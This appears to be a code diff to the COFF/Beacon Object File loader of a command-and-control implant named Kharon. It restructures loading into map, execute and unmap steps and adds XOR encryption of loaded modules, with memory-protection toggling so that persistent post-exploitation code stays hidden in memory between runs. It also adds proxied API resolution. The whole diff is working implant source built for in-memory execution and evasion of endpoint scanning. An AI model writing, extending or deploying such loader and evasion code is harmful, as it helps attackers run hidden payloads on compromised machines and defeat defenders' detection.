@@ -1,73 +1,34 @@
 #include <Kharon.h>
 
-typedef struct {
-    PVOID Base;
-    ULONG Size;
-} SECTION_DATA;
-
-typedef struct {
-    PCHAR Name;
-    ULONG Hash;
-    UINT8 Type; // ( COFF_VAR | COFF_FNC | COFF_IMP )
-    ULONG Rva;
-    PVOID Ptr;
-} SYMBOL_DATA;
-
-typedef struct {
-    SYMBOL_DATA*  Sym;
-    SECTION_DATA* Sec;
-} COFF_DATA;
-
 auto Coff::GetCmdID(
     PVOID Address
 ) -> ULONG {
-    BOF_OBJ* Obj = Node;
-
-    while ( Obj ) {
-        if ( Address >= Obj->MmBegin && Address < Obj->MmEnd ) {
-            return Obj->CmdID; 
-        }
-        Obj = Obj->Next;
-    }
-
-    return 0; 
+    return Self->Jbs->CurrentSubId;
 }
 
 auto Coff::GetTask(
     PVOID Address
 ) -> CHAR* {
-    BOF_OBJ* Obj = Node;
-
-    while ( Obj ) {
-        if ( Address >= Obj->MmBegin && Address < Obj->MmEnd ) {
-            return Obj->UUID; 
-        }
-        Obj = Obj->Next;
-    }
-
-    return nullptr; 
+    return Self->Jbs->CurrentUUID;
 }
 
 auto Coff::Add(
     PVOID MmBegin,
     PVOID MmEnd,
-    CHAR* UUID,
-    ULONG CmdID
+    PVOID Entry
 ) -> BOF_OBJ* {
-    BOF_OBJ* NewObj = (BOF_OBJ*)hAlloc( sizeof( BOF_OBJ ) );
+    BOF_OBJ* NewObj = (BOF_OBJ*)KhAlloc( sizeof( BOF_OBJ ) );
 
     if (
         ! MmBegin ||
-        ! MmEnd   ||
-        ! UUID
+        ! MmEnd  
     ) {
         return nullptr;
     }
 
+    NewObj->Entry   = Entry;
     NewObj->MmBegin = MmBegin;
     NewObj->MmEnd   = MmEnd;
-    NewObj->UUID    = UUID;
-    NewObj->CmdID   = CmdID;
 
     if ( !this->Node ) {
         this->Node = NewObj;
@@ -93,7 +54,7 @@ auto Coff::Rm(
 
     if ( this->Node == Obj ) {
         BOF_OBJ* NextNode = this->Node->Next;
-        hFree( this->Node );
+        KhFree( this->Node );
         this->Node = NextNode;
         return TRUE;
     }
@@ -105,7 +66,7 @@ auto Coff::Rm(
 
     if ( Previous->Next == Obj ) {
         BOF_OBJ* NextNode = Obj->Next;
-        hFree(Obj);      
+        KhFree(Obj);      
         Previous->Next = NextNode;
         return TRUE;
     }
@@ -149,7 +110,7 @@ auto Coff::RslApi(
     //
     // check if is Beacon api and resolve this function
     //
-    if ( Str::StartsWith( (BYTE*)SymName, (BYTE*)"Beacon" ) ) {
+    if ( Str::StartsWith( (BYTE*)SymName, (BYTE*)"Beacon" )  || Str::StartsWith( (BYTE*)SymName, (BYTE*)"Ax" ) ) {
         for ( int i = 0; i < sizeof( ApiTable ) / sizeof( ApiTable[0] ); i++ ) {
             KhDbg("Checking ApiTable[%d] (Hash: 0x%X vs Target: 0x%X)", i, ApiTable[i].Hash, Hsh::Str( SymName ));
             if ( Hsh::Str( SymName ) == ApiTable[i].Hash ) {
@@ -158,7 +119,8 @@ auto Coff::RslApi(
                 break;
             }
         }
-    }
+        
+    } 
 
     KhDbg("symbol not in ApiTable, attempting dynamic resolution");
 
@@ -190,7 +152,6 @@ auto Coff::RslApi(
         Mem::Copy( RawBuff, SymName, Str::LengthA( SymName ) );
         KhDbg("Raw symbol name: %s %d", RawBuff, sizeof(RawBuff) );
 
-        // todo: add hook to specified functions
         for ( INT i = 0; i < sizeof( RawBuff ); i++ ) {
             if ( ( RawBuff[i] == (CHAR)'$' ) ) {
                 OffSet = i; RawBuff[i] = 0;
@@ -205,7 +166,7 @@ auto Coff::RslApi(
         //
         // if hook bof enabled apply the spoof/indirect
         //        
-        if ( Self->Config.BofHook ) {
+        if ( Self->Config.BofProxy ) {
             for ( INT i = 0; i < 15; i++ ) {
                 if ( Hsh::Str( FncName ) == this->HookTable[i].Hash ) {
                     return (PVOID)this->HookTable[i].Ptr;
@@ -247,13 +208,13 @@ auto Coff::RslApi(
     return ApiAddress;
 }
 
-auto Coff::Loader(
-    _In_ BYTE* Buffer,
-    _In_ ULONG Size,
-    _In_ BYTE* Args,
-    _In_ ULONG Argc,
-    _In_ CHAR* UUID,
-    _In_ ULONG CmdID
+//
+// Original Loader function now uses Map + Execute + Unmap
+//
+auto Coff::Map(
+    _In_  BYTE*        Buffer,
+    _In_  ULONG        Size,
+    _Out_ COFF_MAPPED* Mapped
 ) -> BOOL {
     PVOID  MmBase   = nullptr;
     ULONG  MmSize   = 0;
@@ -263,27 +224,27 @@ auto Coff::Loader(
     ULONG SecNbrs = 0;
     ULONG SymNbrs = 0;
 
-    ULONG SecLength = 0;
-    UINT8 Iterator  = 0;
+    UINT8 Iterator = 0;
 
     PIMAGE_FILE_HEADER    Header  = { 0 };
     IMAGE_SECTION_HEADER* SecHdr  = { 0 };
     PIMAGE_SYMBOL         Symbols = { 0 };
     PIMAGE_RELOCATION     Relocs  = { 0 };
 
-    KhDbg("starting COFF loading process");
+    KhDbg("starting COFF mapping process");
 
-    //
-    // check if valid
-    //
-    if ( ! Buffer || Size < sizeof(IMAGE_FILE_HEADER) ) {
+    if ( !Mapped ) {
+        KhDbg("invalid output parameter");
+        return FALSE;
+    }
+
+    Mem::Zero( (UPTR)Mapped, sizeof(COFF_MAPPED) );
+
+    if ( !Buffer || Size < sizeof(IMAGE_FILE_HEADER) ) {
         KhDbg("invalid COFF buffer or size");
         return FALSE;
     }
 
-    //
-    // parse bof headers
-    //
     Header  = (PIMAGE_FILE_HEADER)Buffer;
     SecHdr  = (IMAGE_SECTION_HEADER*)(Buffer + sizeof(IMAGE_FILE_HEADER));
     SecNbrs = Header->NumberOfSections;
@@ -307,24 +268,16 @@ auto Coff::Loader(
 
     COFF_DATA CoffData = { 0 };
 
-    //
-    // allocate memory to section and symbols list
-    //
-    CoffData.Sec = (SECTION_DATA*)hAlloc( SecNbrs * sizeof(SECTION_DATA) );
-    CoffData.Sym = (SYMBOL_DATA*)hAlloc( SymNbrs * sizeof(SYMBOL_DATA) );
+    CoffData.Sec = (SECTION_DATA*)KhAlloc( SecNbrs * sizeof(SECTION_DATA) );
+    CoffData.Sym = (SYMBOL_DATA*)KhAlloc( SymNbrs * sizeof(SYMBOL_DATA) );
     
     if ( !CoffData.Sec || !CoffData.Sym ) {
-        KhDbg("failed to allocate memory for sections/symbols"); return FALSE;
+        KhDbg("failed to allocate memory for sections/symbols");
+        if ( CoffData.Sec ) KhFree( CoffData.Sec );
+        if ( CoffData.Sym ) KhFree( CoffData.Sym );
+        return FALSE;
     }
 
-    KhDbg(
-        "allocated %d bytes for sections and %d bytes for symbols", 
-        SecNbrs * sizeof(SECTION_DATA), SymNbrs * sizeof(SYMBOL_DATA)
-    );
-
-    //
-    // get size for allocation and parse the symbols name
-    //
     for ( INT i = 0; i < SymNbrs; i++ ) {
         PCHAR SymName     = nullptr;
         BYTE StorageClass = Symbols[i].StorageClass;
@@ -347,21 +300,20 @@ auto Coff::Loader(
             continue;
         }
 
-        CoffData.Sym[i].Name = SymName;
-        CoffData.Sym[i].Hash = Hsh::Str<CHAR>(SymName);
-        StorageClass         = Symbols[i].StorageClass;
+        CoffData.Sym[i].Name          = SymName;
+        CoffData.Sym[i].Hash          = Hsh::Str<CHAR>(SymName);
+        CoffData.Sym[i].SectionNumber = Symbols[i].SectionNumber;
 
-        KhDbg("processing symbol %d: %s (Class: 0x%X)", i, SymName, StorageClass);
+        StorageClass = Symbols[i].StorageClass;
 
-        if (Str::StartsWith( (BYTE*)SymName, (BYTE*)"__imp_") ) {
+        if ( Str::StartsWith( (BYTE*)SymName, (BYTE*)"__imp_") ) {
             MmSize = PAGE_ALIGN(MmSize + sizeof(PVOID));
             CoffData.Sym[i].Type = COFF_IMP;
             CoffData.Sym[i].Ptr  = this->RslApi(SymName);
-            KhDbg("import symbol resolved to 0x%p", CoffData.Sym[i].Ptr);
         } 
-        else if (ISFCN(Symbols[i].Type)) {
+        else if ( ISFCN(Symbols[i].Type) ) {
             CoffData.Sym[i].Type = COFF_FNC;
-            CoffData.Sym[i].Rva = Symbols[i].Value;
+            CoffData.Sym[i].Rva  = Symbols[i].Value;
         } 
         else if (
             !ISFCN(Symbols[i].Type) &&
@@ -369,8 +321,7 @@ auto Coff::Loader(
             !Str::StartsWith( (BYTE*)SymName, (BYTE*)"__imp_" ) 
         ) {
             CoffData.Sym[i].Type = COFF_VAR;
-            CoffData.Sym[i].Rva = Symbols[i].Value;
-            KhDbg("variable symbol identified: %s", SymName);
+            CoffData.Sym[i].Rva  = Symbols[i].Value;
         }
     }
 
@@ -378,36 +329,27 @@ auto Coff::Loader(
         MmSize = PAGE_ALIGN( MmSize + SecHdr[i].SizeOfRawData );
     }
 
-    //
-    // allocate memory to store bof
-    //
     KhDbg("total memory required: %d bytes (aligned)", MmSize);
     MmBase = Self->Mm->Alloc( nullptr, MmSize, MEM_COMMIT, PAGE_READWRITE );
     if ( !MmBase ) {
-        KhDbg("failed to allocate memory for COFF"); goto _KH_END;
+        KhDbg("failed to allocate memory for COFF");
+        KhFree( CoffData.Sec );
+        KhFree( CoffData.Sym );
+        return FALSE;
     }
 
     KhDbg("allocated memory at 0x%p", MmBase);
 
-    // 
-    // copy sections to memory allocated and align the page
-    // 
     TmpBase = MmBase;
-    for (INT i = 0; i < SecNbrs; i++) {
+    for ( INT i = 0; i < SecNbrs; i++ ) {
         CoffData.Sec[i].Base = TmpBase;
         CoffData.Sec[i].Size = SecHdr[i].SizeOfRawData;
-
-        KhDbg(
-            "[x] section\n\t- name: %s\n\t- base: %p\n\t- size: %d", 
-            SecHdr[i].Name, CoffData.Sec[i].Base, CoffData.Sec[i].Size
-        );
 
         Mem::Copy(
             (BYTE*)TmpBase + SecHdr[i].VirtualAddress,
             Buffer + SecHdr[i].PointerToRawData,
             SecHdr[i].SizeOfRawData
         );
-
 
         TmpBase = (PVOID)PAGE_ALIGN((ULONG_PTR)TmpBase + SecHdr[i].SizeOfRawData);
     }
@@ -421,78 +363,306 @@ auto Coff::Loader(
         PVOID* ImportTable = (PVOID*)LastSec;
         for ( INT i = 0; i < SecNbrs; i++ ) {
             Relocs = (PIMAGE_RELOCATION)( Buffer + SecHdr[i].PointerToRelocations );
-            KhDbg("processing %d relocations for section %s %d", SecHdr[i].NumberOfRelocations, SecHdr[i].Name, i);
 
             for ( INT x = 0; x < SecHdr[i].NumberOfRelocations; x++ ) {
                 PIMAGE_SYMBOL SymReloc = &Symbols[Relocs[x].SymbolTableIndex];
                 PVOID RelocAddr = (PVOID)((ULONG_PTR)CoffData.Sec[i].Base + Relocs[x].VirtualAddress);
 
-                KhDbg("processing symbol: %s", CoffData.Sym[Relocs[x].SymbolTableIndex].Name);
-
                 if ( Relocs[x].Type == IMAGE_REL_AMD64_REL32 && CoffData.Sym[Relocs[x].SymbolTableIndex].Type == COFF_IMP ) {
-
                     ImportTable[Iterator] = CoffData.Sym[Relocs[x].SymbolTableIndex].Ptr;
                     DEF32( RelocAddr ) = (UINT32)((ULONG_PTR)&ImportTable[Iterator] - (ULONG_PTR)RelocAddr - 4);
                     Iterator++;
-                    KhDbg("applied REL32 import relocation at %p", RelocAddr);
-
                 } else {
                     PVOID TargetBase = CoffData.Sec[SymReloc->SectionNumber-1].Base;
                     PVOID TargetAddr = (PVOID)((ULONG_PTR)TargetBase + SymReloc->Value);
                     this->RslRel(TargetAddr, RelocAddr, Relocs[x].Type);
-
-                    KhDbg("relocated target %p", TargetAddr);
                 }
             }
         }
     }
 
     //
-    // Set proper memory protections
+    // count executable sections and store their info
     //
-    for (INT j = 0; j < SecNbrs; j++) {
-        ULONG OldProt = 0;
+    ULONG ExecCount = 0;
+    for ( INT j = 0; j < SecNbrs; j++ ) {
+        if ( SecHdr[j].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
+            ExecCount++;
+        }
+    }
+
+    if ( ExecCount > 0 ) {
+        Mapped->ExecSections = (PVOID*)KhAlloc( ExecCount * sizeof(PVOID) );
+        Mapped->ExecSizes    = (ULONG*)KhAlloc( ExecCount * sizeof(ULONG) );
         
-        if ( SecHdr[j].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
-            ULONG NewProt = PAGE_EXECUTE_READ;
-            Self->Mm->Protect( CoffData.Sec[j].Base, CoffData.Sec[j].Size, NewProt, &OldProt );
+        if ( Mapped->ExecSections && Mapped->ExecSizes ) {
+            ULONG idx = 0;
+            for ( INT j = 0; j < SecNbrs; j++ ) {
+                if ( SecHdr[j].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
+                    Mapped->ExecSections[idx] = CoffData.Sec[j].Base;
+                    Mapped->ExecSizes[idx]    = CoffData.Sec[j].Size;
+                    idx++;
+                }
+            }
+            Mapped->ExecCount = ExecCount;
         }
     }
 
     //
-    // found the go symbol (entrypoint), change the section protection and call
+    // set proper memory protections
     //
+    for ( INT j = 0; j < SecNbrs; j++ ) {
+        ULONG OldProt = 0;
+        
+        if ( SecHdr[j].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
+            Self->Mm->Protect( CoffData.Sec[j].Base, CoffData.Sec[j].Size, PAGE_EXECUTE_READ, &OldProt );
+        }
+    }
+
+    //
+    // find the 'go' symbol (entrypoint)
+    //
+    PVOID EntryPoint = nullptr;
     for ( INT i = 0; i < SymNbrs; i++ ) {
         if (
-             CoffData.Sym[i].Type == COFF_FNC &&
-             CoffData.Sym[i].Hash == Hsh::Str<CHAR>( "go" )
+            CoffData.Sym[i].Type == COFF_FNC &&
+            CoffData.Sym[i].Hash == Hsh::Str<CHAR>( "go" )
         ) {
             for ( INT j = 0; j < SecNbrs; j++ ) {
                 if ( Symbols[i].SectionNumber == j + 1 ) {
-                    PVOID GoPtr = PTR( U_PTR( CoffData.Sec[j].Base ) + Symbols[i].Value );
-                    ULONG OldProt = 0;
-
-                    KhDbg("found 'go' function at 0x%p (Section %d, Offset 0x%X)", GoPtr, j, Symbols[i].Value);
-
-                    BOF_OBJ* Obj = (BOF_OBJ*)this->Add( MmBase, PTR( U_PTR( MmBase ) + MmSize ), UUID, CmdID );
-                    if ( Obj ) KhDbg("added the object to the list");
-
-                    VOID ( *Go )( BYTE*, ULONG ) = ( decltype( Go ) )( GoPtr );
-                    KhDbg("calling 'go' function");
-                    Go( Args, Argc );
-
-                    if ( this->Rm( Obj ) ) KhDbg("removed the object to the list");
+                    EntryPoint = PTR( U_PTR( CoffData.Sec[j].Base ) + Symbols[i].Value );
+                    KhDbg("found 'go' function at 0x%p", EntryPoint);
+                    break;
                 }
             }
+            break;
         }
     }
 
-_KH_END:
-    if ( MmBase       ) Self->Mm->Free( MmBase, MmSize, MEM_RELEASE );
-    if ( CoffData.Sec ) hFree( CoffData.Sec );
-    if ( CoffData.Sym ) hFree( CoffData.Sym );
+    if ( !EntryPoint ) {
+        KhDbg("'go' entrypoint not found - COFF may use custom entry points");
+    }
 
-    KhDbg("COFF loading completed");
-    
+    Mapped->MmBase       = MmBase;
+    Mapped->MmSize       = MmSize;
+    Mapped->EntryPoint   = EntryPoint;
+    Mapped->CoffData     = CoffData;
+    Mapped->SecNbrs      = SecNbrs;
+    Mapped->SymNbrs      = SymNbrs;
+    Mapped->IsObfuscated = FALSE;
+
+    KhDbg("COFF mapped successfully");
+
     return TRUE;
+}
+
+//
+// Obfuscates a mapped COFF (RX -> RW + XOR)
+//
+auto Coff::Obfuscate(
+    _In_ COFF_MAPPED* Mapped
+) -> BOOL {
+    if ( !Mapped || !Mapped->MmBase || Mapped->IsObfuscated ) {
+        KhDbg("invalid mapped COFF or already obfuscated");
+        return FALSE;
+    }
+
+    KhDbg("obfuscating COFF at 0x%p", Mapped->MmBase);
+
+    //
+    // change executable sections to RW
+    //
+    for ( ULONG i = 0; i < Mapped->ExecCount; i++ ) {
+        ULONG OldProt = 0;
+        Self->Mm->Protect( 
+            Mapped->ExecSections[i], Mapped->ExecSizes[i], PAGE_READWRITE, &OldProt 
+        );
+
+        KhDbg("section %d changed to RW: 0x%p (%d bytes)", i, Mapped->ExecSections[i], Mapped->ExecSizes[i]);
+    }
+
+    //
+    // XOR encrypt entire region
+    //
+    Self->Crp->Xor( (BYTE*)Mapped->MmBase, Mapped->MmSize );
+
+    Mapped->IsObfuscated = TRUE;
+    KhDbg("COFF obfuscated successfully");
+
+    return TRUE;
+}
+
+//
+// Deobfuscates a mapped COFF
+//
+auto Coff::Deobfuscate(
+    _In_ COFF_MAPPED* Mapped
+) -> BOOL {
+    if ( !Mapped || !Mapped->MmBase || !Mapped->IsObfuscated ) {
+        KhDbg("invalid mapped COFF or not obfuscated");
+        return FALSE;
+    }
+
+    KhDbg("deobfuscating COFF at 0x%p", Mapped->MmBase);
+
+    //
+    // XOR decrypt entire region
+    //
+    Self->Crp->Xor( (BYTE*)Mapped->MmBase, Mapped->MmSize );
+
+    //
+    // change executable sections back to RX
+    //
+    for ( ULONG i = 0; i < Mapped->ExecCount; i++ ) {
+        ULONG OldProt = 0;
+        
+        Self->Mm->Protect( 
+            Mapped->ExecSections[i], Mapped->ExecSizes[i], PAGE_EXECUTE_READ, &OldProt 
+        );
+
+        KhDbg("section %d changed to RX: 0x%p (%d bytes)", i, Mapped->ExecSections[i], Mapped->ExecSizes[i]);
+    }
+
+    Mapped->IsObfuscated = FALSE;
+    KhDbg("COFF deobfuscated successfully");
+
+    return TRUE;
+}
+
+//
+// Executes a previously mapped COFF 
+//
+auto Coff::Execute(
+    _In_ COFF_MAPPED* Mapped,
+    _In_ BYTE*        Args,
+    _In_ ULONG        Argc
+) -> BOOL {
+    if ( !Mapped || !Mapped->MmBase || !Mapped->EntryPoint ) {
+        KhDbg("invalid mapped COFF");
+        return FALSE;
+    }
+
+    //
+    // deobfuscate if needed
+    //
+    BOOL WasObfuscated = Mapped->IsObfuscated;
+    if ( WasObfuscated ) {
+        if ( !this->Deobfuscate( Mapped ) ) {
+            KhDbg("failed to deobfuscate COFF");
+            return FALSE;
+        }
+    }
+
+    KhDbg("executing mapped COFF at 0x%p", Mapped->EntryPoint);
+
+    BOF_OBJ* Obj = (BOF_OBJ*)this->Add( 
+        Mapped->MmBase, PTR( U_PTR( Mapped->MmBase ) + Mapped->MmSize ), Mapped->EntryPoint 
+    );
+
+    if ( Obj ) KhDbg("added the object to the list");
+
+    VOID ( *Go )( BYTE*, ULONG ) = ( decltype( Go ) )( Mapped->EntryPoint );
+    KhDbg("calling 'go' function");
+    Go( Args, Argc );
+
+    //
+    // for persistent COFFs (PostEx), re-obfuscate after execution
+    //
+    if ( (Action::Task)Self->Jbs->CurrentCmdId == Action::Task::PostEx ) {
+        this->Obfuscate( Mapped );
+    } else {
+        if ( this->Rm( Obj ) ) KhDbg("removed the object from the list");
+    }
+
+    return TRUE;
+}
+
+//
+// Frees a mapped COFF
+//
+auto Coff::Unmap(
+    _In_ COFF_MAPPED* Mapped
+) -> BOOL {
+    if ( !Mapped ) {
+        return FALSE;
+    }
+
+    //
+    // deobfuscate before freeing (optional, but cleaner)
+    //
+    if ( Mapped->IsObfuscated ) {
+        Self->Crp->Xor( (BYTE*)Mapped->MmBase, Mapped->MmSize );
+    }
+
+    if ( Mapped->MmBase ) {
+        Self->Mm->Free( Mapped->MmBase, Mapped->MmSize, MEM_RELEASE );
+    }
+
+    if ( Mapped->CoffData.Sec )  KhFree( Mapped->CoffData.Sec );
+    if ( Mapped->CoffData.Sym )  KhFree( Mapped->CoffData.Sym );
+    if ( Mapped->ExecSections )  KhFree( Mapped->ExecSections );
+    if ( Mapped->ExecSizes )     KhFree( Mapped->ExecSizes );
+
+    Mem::Zero( (UPTR)Mapped, sizeof(COFF_MAPPED) );
+
+    KhDbg("COFF unmapped successfully");
+
+    return TRUE;
+}
+
+auto Coff::FindSymbol(
+    _In_ COFF_MAPPED* Mapped,
+    _In_ PCHAR        SymName
+) -> PVOID {
+    
+    if ( !Mapped || !SymName ) return nullptr;
+
+    ULONG TargetHash = Hsh::Str<CHAR>( SymName );
+
+    SECTION_DATA* Sec = Mapped->CoffData.Sec;
+    SYMBOL_DATA*  Sym = Mapped->CoffData.Sym;
+    
+    for ( ULONG i = 0; i < Mapped->SymNbrs; i++ ) {
+        if ( Sym[i].Type == COFF_FNC && Sym[i].Hash == TargetHash ) {
+            
+            INT16 SecIdx = Sym[i].SectionNumber - 1; 
+            
+            if ( SecIdx >= 0 && (ULONG)SecIdx < Mapped->SecNbrs ) {
+                PVOID Address = PTR( U_PTR( Sec[SecIdx].Base ) + Sym[i].Rva );
+                KhDbg("FindSymbol: found '%s' at 0x%p (section %d, rva 0x%x)", 
+                      SymName, Address, SecIdx, Sym[i].Rva);
+                return Address;
+            }
+        }
+    }
+    
+    KhDbg("FindSymbol: '%s' not found", SymName);
+    return nullptr;
+}
+
+//
+// Original Loader function
+//
+auto Coff::Loader(
+    _In_ BYTE* Buffer,
+    _In_ ULONG Size,
+    _In_ BYTE* Args,
+    _In_ ULONG Argc
+) -> BOOL {
+    COFF_MAPPED Mapped = { 0 };
+
+    if ( !this->Map( Buffer, Size, &Mapped ) ) {
+        return FALSE;
+    }
+
+    BOOL Result = this->Execute( &Mapped, Args, Argc );
+
+    //
+    // only unmap if not persistent (PostEx stays mapped + obfuscated)
+    //
+    if ( (Action::Task)Self->Jbs->CurrentCmdId != Action::Task::PostEx ) {
+        this->Unmap( &Mapped );
+    }
+
+    return Result;
 }
